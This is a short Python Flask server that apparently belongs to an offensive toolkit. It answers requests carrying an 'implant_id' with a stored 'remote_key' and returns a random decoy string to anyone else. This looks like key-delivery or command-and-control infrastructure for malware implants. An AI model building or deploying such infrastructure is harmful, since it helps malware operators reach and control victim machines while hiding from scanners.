import argparse

from flask import Flask
from flask import request
from models.models import Database

from core.helpers.crypto import random_string


app = Flask(__name__)

@app.route('/')
def entry_point():
    
    alt = random_string()

    implant_id = request.args.get('id', None)

    if args.debug:
        print('Implant id is', implant_id)
    
    if implant_id is None:
        return alt

    implant_id = implant_id.strip()

    if args.debug:
        print(list(implant_id))
        print(type(implant_id))

    db = Database()
    db.initialize()
    remote_key = db.retrieve(implant_id)

    if args.debug:
        print('remote_key is', remote_key)

    if remote_key is None:
        return alt

    return remote_key

if __name__ == '__main__':

    parser = argparse.ArgumentParser()

    parser.add_argument('--lport',
                        dest='lport',
                        type=int,
                        default=80,
                        help='Set listening port')

    parser.add_argument('--lhost',
                        dest='lhost',
                        type=str,
                        default='0.0.0.0',
                        help='Set listening host')

    parser.add_argument('--debug',
                        dest='debug',
                        action='store_true',
                        help='Run server in debug mode')

    args = parser.parse_args()

    app.run(debug=args.debug, host=args.lhost, port=args.lport)
